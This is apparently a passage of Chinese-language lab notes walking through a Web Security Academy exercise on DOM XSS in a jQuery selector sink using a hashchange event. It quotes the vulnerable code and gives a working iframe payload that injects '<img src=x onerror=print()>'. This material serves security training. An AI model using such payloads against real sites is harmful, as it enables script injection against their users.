    16. DOM XSS in jQuery selector sink using a hashchange event【使用 hashchange 事件进行 jQuery 选择器中的 DOM XSS 下沉】
    17. 题目描述
    18. 通关过程
      1. 浏览页面找到js代码执行逻辑 
           $(window).on('hashchange', function(){
       var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
       if (post) post.get(0).scrollIntoView();
   });
        监听hashchange事件，如果改变就执行function中的操作
        1. window.location.hash.slice(1)获取hash值不带#的部分
        2. decodeURIComponent()对刚刚获取的hash值进行url解码
        3. $('section.blog-list h2:contains('')将刚刚获取的解码后的hash值直接拼接到jQuery选择器中
        4. if (post)如果找到了要匹配的元素
        5. post.get(0)获取jQuery对象中的第一个DOM元素
        6. .scrollIntoView();滚动页面到该元素的位置
      2. 漏洞利用点：:contains()选择器的参数是直接拼接到选择器字符串中的，攻击者可以注入恶意的选择器语法！
      3. 构造payload 
        <iframe src="https://0a01007f0403a04280cb6769004200f7.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
        关键点：创建一个隐藏的iframe（内联框架），通过两次加载来触发xss 1. 首先加载一个带hash但值为空的url【需要先加载一个干净的页面，然后动态添加恶意代码】 2. 然后通过onload事件，在iframe加载完成后自动执行恶意代码 1. 通过this.src获取/设置iframe自身的src属性 2. 通过+=追加字符串
      4. 攻击流程
        1. 向受害者发送含有该payload的http请求
